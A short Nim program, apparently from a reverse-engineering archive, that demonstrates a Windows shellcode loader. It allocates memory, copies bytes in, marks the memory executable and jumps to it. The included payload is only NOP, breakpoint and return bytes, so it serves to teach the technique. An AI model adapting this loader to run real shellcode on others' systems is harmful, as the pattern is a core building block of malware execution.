#[
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode by jump to it.

Compile:
    $ nim c code.nim

Technique:
    - allocation: VirtualAlloc
    - writing     copyMem
    - permission: VirtualProtect
    - execution:  
]#
import winim 

when isMainModule:
    var old_protect: DWORD = 0

    # shellcode storage in stack
    var payload: array[4, byte] = [byte 0x90, 0x90, 0xCC, 0xC3]

    # allocate memory buffer for payload as READ-WRITE (no executable)    
    var runtime = VirtualAlloc(nil, payload.len, MEM_COMMIT, PAGE_READWRITE)

    # copy payload to the buffer
    copyMem(runtime, unsafeAddr payload, payload.len)

    # make buffer executable (R-X)
    var retval = VirtualProtect(runtime, payload.len, PAGE_EXECUTE_READ, addr old_protect)
    if retval != 0:
        let f = cast[proc(){.nimcall.}](runtime)
        f()
    
    VirtualFree(runtime, payload.len, MEM_RELEASE)
